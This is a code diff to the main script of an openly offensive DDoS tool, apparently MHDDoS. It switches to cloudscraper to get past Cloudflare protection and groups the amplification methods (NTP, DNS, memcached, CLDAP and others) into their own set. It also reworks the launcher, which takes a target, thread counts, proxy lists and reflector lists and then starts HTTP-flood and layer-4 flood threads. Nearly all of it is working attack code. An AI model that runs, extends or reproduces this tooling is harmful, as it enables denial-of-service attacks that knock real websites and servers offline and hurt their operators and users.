@@ -27,13 +27,15 @@ from uuid import UUID, uuid4
 from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
 from PyRoxy import Tools as ProxyTools
 from certifi import where
-from cfscrape import create_scraper
+from cloudscraper import create_scraper
 from dns import resolver
 from icmplib import ping
 from impacket.ImpactPacket import IP, TCP, UDP, Data
 from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
 from requests import Response, Session, exceptions, get, cookies
 from yarl import URL
+from re import compile
+
 
 basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
             datefmt="%H:%M:%S")
@@ -48,25 +50,27 @@ __dir__: Path = Path(__file__).parent
 __ip__: Any = None
 
 
+with open(__dir__ / "config.json") as f:
+  con = load(f)
+
 def getMyIPAddress():
     global __ip__
     if __ip__:
         return __ip__
     with suppress(Exception):
-        __ip__ = get('https://api.my-ip.io/ip', timeout=.1).text
+        return get('https://api.my-ip.io/ip', timeout=.1).text
     with suppress(Exception):
-        __ip__ = get('https://ipwhois.app/json/', timeout=.1).json()["ip"]
+        return get('https://ipwhois.app/json/', timeout=.1).json()["ip"]
     with suppress(Exception):
-        __ip__ = get('https://ipinfo.io/json', timeout=.1).json()["ip"]
+        return get('https://ipinfo.io/json', timeout=.1).json()["ip"]
     with suppress(Exception):
-        __ip__ = ProxyTools.Patterns.IP.search(get('http://checkip.dyndns.org/', timeout=.1).text)
+        return ProxyTools.Patterns.IP.search(get('http://checkip.dyndns.org/', timeout=.1).text)
     with suppress(Exception):
-        __ip__ = ProxyTools.Patterns.IP.search(get('https://spaceiran.com/myip/', timeout=.1).text)
+        return ProxyTools.Patterns.IP.search(get('https://spaceiran.com/myip/', timeout=.1).text)
     with suppress(Exception):
-        __ip__ = get('https://ip.42.pl/raw', timeout=.1).text
+        return get('https://ip.42.pl/raw', timeout=.1).text
     return getMyIPAddress()
 
-  
   
 class bcolors:
     HEADER = '\033[95m'
@@ -95,11 +99,18 @@ class Methods:
         "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER"
     }
 
-    LAYER4_METHODS: Set[str] = {
-        "TCP", "UDP", "SYN", "VSE", "MINECRAFT", "MEM", "NTP", "DNS", "ARD",
-        "CHAR", "RDP", "MCBOT", "CONNECTION", "CPS", "FIVEM", "TS3", "MCPE",
-        "CLDAP"
+
+    LAYER4_AMP: Set[str] = {
+        "MEM", "NTP", "DNS", "ARD",
+        "CLDAP", "CHAR", "RDP"
     }
+
+
+    LAYER4_METHODS: Set[str] = {*LAYER4_AMP,
+        "TCP", "UDP", "SYN", "VSE", "MINECRAFT",
+        "MCBOT", "CONNECTION", "CPS", "FIVEM", "TS3", "MCPE"
+    }
+
     ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}
 
 
@@ -134,6 +145,7 @@ BYTES_SEND = Counter()
 
 
 class Tools:
+    IP = compile("(?:\d{1,3}\.){3}\d{1,3}")
 
     @staticmethod
     def humanbytes(i: int, binary: bool = False, precision: int = 2):
@@ -477,7 +489,7 @@ class Layer4(Thread):
                                                         2,
                                                         ProxyTools.Random.rand_ipv4(),
                                                         uuid4()))
-            Tools.send(s, Minecraft.login(f"MHDDoS_{ProxyTools.Random.rand_str(5)}"))
+            Tools.send(s, Minecraft.login(f"{con['MCBOT']}{ProxyTools.Random.rand_str(5)}"))
             sleep(1.5)
 
             c = 360
@@ -527,7 +539,7 @@ class Layer4(Thread):
 
     def _genrate_syn(self) -> bytes:
         ip: IP = IP()
-        ip.set_ip_src(getMyIPAddress())
+        ip.set_ip_src(__ip__)
         ip.set_ip_dst(self._target[0])
         tcp: TCP = TCP()
         tcp.set_SYN()
@@ -621,7 +633,7 @@ class HttpFlood(Thread):
                          'Accept-Encoding: gzip, deflate, br\r\n'
                          'Accept-Language: en-US,en;q=0.9\r\n'
                          'Cache-Control: max-age=0\r\n'
-                         'Connection: Keep-Alive\r\n'
+                         'Connection: keep-alive\r\n'
                          'Sec-Fetch-Dest: document\r\n'
                          'Sec-Fetch-Mode: navigate\r\n'
                          'Sec-Fetch-Site: none\r\n'
@@ -1388,162 +1400,167 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
 
 
 if __name__ == '__main__':
-    with open(__dir__ / "config.json") as f:
-        con = load(f)
-        with suppress(KeyboardInterrupt):
-            with suppress(IndexError):
-                one = argv[1].upper()
+      with suppress(KeyboardInterrupt):
+          with suppress(IndexError):
+              one = argv[1].upper()
 
-                if one == "HELP":
-                    raise IndexError()
-                if one == "TOOLS":
-                    ToolsConsole.runConsole()
-                if one == "STOP":
-                    ToolsConsole.stop()
+              if one == "HELP":
+                  raise IndexError()
+              if one == "TOOLS":
+                  ToolsConsole.runConsole()
+              if one == "STOP":
+                  ToolsConsole.stop()
 
-                method = one
-                host = None
-                port= None
-                url = None
-                event = Event()
-                event.clear()
-                target = None
-                urlraw = argv[2].strip()
-                if not urlraw.startswith("http"):
-                    urlraw = "http://" + urlraw
+              method = one
+              host = None
+              port= None
+              url = None
+              event = Event()
+              event.clear()
+              target = None
+              urlraw = argv[2].strip()
+              if not urlraw.startswith("http"):
+                  urlraw = "http://" + urlraw
 
-                if method not in Methods.ALL_METHODS:
-                    exit("Method Not Found %s" %
-                         ", ".join(Methods.ALL_METHODS))
+              if method not in Methods.ALL_METHODS:
+                  exit("Method Not Found %s" %
+                       ", ".join(Methods.ALL_METHODS))
 
-                if method in Methods.LAYER7_METHODS:
-                    url = URL(urlraw)
-                    host = url.host
-                    try:
-                        host = gethostbyname(url.host)
-                    except Exception as e:
-                        exit('Cannot resolve hostname ', url.host, e)
-                    threads = int(argv[4])
-                    rpc = int(argv[6])
-                    timer = int(argv[7])
-                    proxy_ty = int(argv[3].strip())
-                    proxy_li = Path(__dir__ / "files/proxies/" /
-                                    argv[5].strip())
-                    useragent_li = Path(__dir__ / "files/useragent.txt")
-                    referers_li = Path(__dir__ / "files/referers.txt")
-                    bombardier_path = Path.home() / "go/bin/bombardier"
-                    proxies: Any = set()
 
-                    if method == "BOMB":
-                        assert (
-                                bombardier_path.exists()
-                                or bombardier_path.with_suffix('.exe').exists()
-                        ), (
-                            "Install bombardier: "
-                            "https://github.com/MHProDev/MHDDoS/wiki/BOMB-method"
-                        )
+              if method in Methods.LAYER7_METHODS:
+                  url = URL(urlraw)
+                  host = url.host
+                  try:
+                      host = gethostbyname(url.host)
+                  except Exception as e:
+                      exit('Cannot resolve hostname ', url.host, e)
+                  threads = int(argv[4])
+                  rpc = int(argv[6])
+                  timer = int(argv[7])
+                  proxy_ty = int(argv[3].strip())
+                  proxy_li = Path(__dir__ / "files/proxies/" /
+                                  argv[5].strip())
+                  useragent_li = Path(__dir__ / "files/useragent.txt")
+                  referers_li = Path(__dir__ / "files/referers.txt")
+                  bombardier_path = Path.home() / "go/bin/bombardier"
+                  proxies: Any = set()
 
-                    if len(argv) == 9:
-                        logger.setLevel("DEBUG")
+                  if method == "BOMB":
+                      assert (
+                              bombardier_path.exists()
+                              or bombardier_path.with_suffix('.exe').exists()
+                      ), (
+                          "Install bombardier: "
+                          "https://github.com/MHProDev/MHDDoS/wiki/BOMB-method"
+                      )
 
-                    if not useragent_li.exists():
-                        exit("The Useragent file doesn't exist ")
-                    if not referers_li.exists():
-                        exit("The Referer file doesn't exist ")
+                  if len(argv) == 9:
+                      logger.setLevel("DEBUG")
 
-                    uagents = set(a.strip()
-                                  for a in useragent_li.open("r+").readlines())
-                    referers = set(a.strip()
-                                   for a in referers_li.open("r+").readlines())
+                  if not useragent_li.exists():
+                      exit("The Useragent file doesn't exist ")
+                  if not referers_li.exists():
+                      exit("The Referer file doesn't exist ")
 
-                    if not uagents: exit("Empty Useragent File ")
-                    if not referers: exit("Empty Referer File ")
+                  uagents = set(a.strip()
+                                for a in useragent_li.open("r+").readlines())
+                  referers = set(a.strip()
+                                 for a in referers_li.open("r+").readlines())
 
-                    if threads > 1000:
-                        logger.warning("Thread is higher than 1000")
-                    if rpc > 100:
-                        logger.warning(
-                            "RPC (Request Pre Connection) is higher than 100")
+                  if not uagents: exit("Empty Useragent File ")
+                  if not referers: exit("Empty Referer File ")
 
-                    proxies = handleProxyList(con, proxy_li, proxy_ty, url)
-                    for thread_id in range(threads):
-                        HttpFlood(thread_id, url, host, method, rpc, event,
-                                  uagents, referers, proxies).start()
+                  if threads > 1000:
+                      logger.warning("Thread is higher than 1000")
+                  if rpc > 100:
+                      logger.warning(
+                          "RPC (Request Pre Connection) is higher than 100")
 
-                if method in Methods.LAYER4_METHODS:
-                    target = URL(urlraw)
+                  proxies = handleProxyList(con, proxy_li, proxy_ty, url)
+                  for thread_id in range(threads):
+                      HttpFlood(thread_id, url, host, method, rpc, event,
+                                uagents, referers, proxies).start()
 
-                    port = target.port
-                    target = target.host
+              if method in Methods.LAYER4_METHODS:
+                  target = URL(urlraw)
 
-                    try:
-                        target = gethostbyname(target)
-                    except Exception as e:
-                        exit('Cannot resolve hostname ', url.host, e)
+                  port = target.port
+                  target = target.host
 
-                    if port > 65535 or port < 1:
-                        exit("Invalid Port [Min: 1 / Max: 65535] ")
+                  try:
+                      target = gethostbyname(target)
+                  except Exception as e:
+                      exit('Cannot resolve hostname ', url.host, e)
 
-                    if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD", "SYN"} and \
-                            not ToolsConsole.checkRawSocket():
-                        exit("Cannot Create Raw Socket")
+                  if port > 65535 or port < 1:
+                      exit("Invalid Port [Min: 1 / Max: 65535] ")
 
-                    threads = int(argv[3])
-                    timer = int(argv[4])
-                    proxies = None
-                    ref = None
-                    if not port:
-                        logger.warning("Port Not Selected, Set To Default: 80")
-                        port = 80
+                  if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD", "SYN"} and \
+                          not ToolsConsole.checkRawSocket():
+                      exit("Cannot Create Raw Socket")
 
-                    if len(argv) >= 6:
-                        argfive = argv[5].strip()
-                        if argfive:
-                            refl_li = Path(__dir__ / "files" / argfive)
-                            if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD"}:
-                                if not refl_li.exists():
-                                    exit("The reflector file doesn't exist")
-                                if len(argv) == 7:
-                                    logger.setLevel("DEBUG")
-                                ref = set(a.strip()
-                                          for a in ProxyTools.Patterns.IP.findall(
-                                    refl_li.open("r+").read()))
-                                if not ref: exit("Empty Reflector File ")
+                  if method in Methods.LAYER4_AMP:
+                      logger.warning("this method need spoofable servers please check")
+                      logger.warning("https://github.com/MHProDev/MHDDoS/wiki/Amplification-ddos-attack")
 
-                            elif argfive.isdigit() and len(argv) >= 7:
-                                if len(argv) == 8:
-                                    logger.setLevel("DEBUG")
-                                proxy_ty = int(argfive)
-                                proxy_li = Path(__dir__ / "files/proxies" / argv[6].strip())
-                                proxies = handleProxyList(con, proxy_li, proxy_ty)
-                                if method not in {"MINECRAFT", "MCBOT", "TCP", "CPS", "CONNECTION"}:
-                                    exit("this method cannot use for layer4 proxy")
+                  threads = int(argv[3])
+                  timer = int(argv[4])
+                  proxies = None
+                  ref = None
 
-                            else:
-                                logger.setLevel("DEBUG")
+                  if not port:
+                      logger.warning("Port Not Selected, Set To Default: 80")
+                      port = 80
 
-                    for _ in range(threads):
-                        Layer4((target, port), ref, method, event,
-                               proxies).start()
+                  if method == "SYN":
+                      __ip__ = getMyIPAddress()
 
-                logger.info(
-                    f"{bcolors.WARNING}Attack Started to{bcolors.OKBLUE} %s{bcolors.WARNING} with{bcolors.OKBLUE} %s{bcolors.WARNING} method for{bcolors.OKBLUE} %s{bcolors.WARNING} seconds, threads:{bcolors.OKBLUE} %d{bcolors.WARNING}!{bcolors.RESET}"
-                    % (target or url.host, method, timer, threads))
-                event.set()
-                ts = time()
-                while time() < ts + timer:
-                    logger.debug(f'{bcolors.WARNING}Target:{bcolors.OKBLUE} %s,{bcolors.WARNING} Port:{bcolors.OKBLUE} %s,{bcolors.WARNING} Method:{bcolors.OKBLUE} %s{bcolors.WARNING} PPS:{bcolors.OKBLUE} %s,{bcolors.WARNING} BPS:{bcolors.OKBLUE} %s / %d%%{bcolors.RESET}' %
-                                 (target or url.host,
-                                  port or (url.port or 80),
-                                  method,
-                                  Tools.humanformat(int(REQUESTS_SENT)),
-                                  Tools.humanbytes(int(BYTES_SEND)),
-                                  round((time() - ts) / timer * 100, 2)))  
-                    REQUESTS_SENT.set(0)
-                    BYTES_SEND.set(0)
-                    sleep(1)
+                  if len(argv) >= 6:
+                      argfive = argv[5].strip()
+                      if argfive:
+                          refl_li = Path(__dir__ / "files" / argfive)
+                          if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD"}:
+                              if not refl_li.exists():
+                                  exit("The reflector file doesn't exist")
+                              if len(argv) == 7:
+                                  logger.setLevel("DEBUG")
+                              ref = set(a.strip()
+                                        for a in Tools.IP.findall(refl_li.open("r").read()))
+                              if not ref: exit("Empty Reflector File ")
 
-                event.clear()
-                exit()
+                          elif argfive.isdigit() and len(argv) >= 7:
+                              if len(argv) == 8:
+                                  logger.setLevel("DEBUG")
+                              proxy_ty = int(argfive)
+                              proxy_li = Path(__dir__ / "files/proxies" / argv[6].strip())
+                              proxies = handleProxyList(con, proxy_li, proxy_ty)
+                              if method not in {"MINECRAFT", "MCBOT", "TCP", "CPS", "CONNECTION"}:
+                                  exit("this method cannot use for layer4 proxy")
 
-            ToolsConsole.usage()
+                          else:
+                              logger.setLevel("DEBUG")
+                  for _ in range(threads):
+                      Layer4((target, port), ref, method, event,
+                             proxies).start()
+
+              logger.info(
+                  f"{bcolors.WARNING}Attack Started to{bcolors.OKBLUE} %s{bcolors.WARNING} with{bcolors.OKBLUE} %s{bcolors.WARNING} method for{bcolors.OKBLUE} %s{bcolors.WARNING} seconds, threads:{bcolors.OKBLUE} %d{bcolors.WARNING}!{bcolors.RESET}"
+                  % (target or url.host, method, timer, threads))
+              event.set()
+              ts = time()
+              while time() < ts + timer:
+                  logger.debug(f'{bcolors.WARNING}Target:{bcolors.OKBLUE} %s,{bcolors.WARNING} Port:{bcolors.OKBLUE} %s,{bcolors.WARNING} Method:{bcolors.OKBLUE} %s{bcolors.WARNING} PPS:{bcolors.OKBLUE} %s,{bcolors.WARNING} BPS:{bcolors.OKBLUE} %s / %d%%{bcolors.RESET}' %
+                               (target or url.host,
+                                port or (url.port or 80),
+                                method,
+                                Tools.humanformat(int(REQUESTS_SENT)),
+                                Tools.humanbytes(int(BYTES_SEND)),
+                                round((time() - ts) / timer * 100, 2)))  
+                  REQUESTS_SENT.set(0)
+                  BYTES_SEND.set(0)
+                  sleep(1)
+
+              event.clear()
+              exit()
+
+          ToolsConsole.usage()
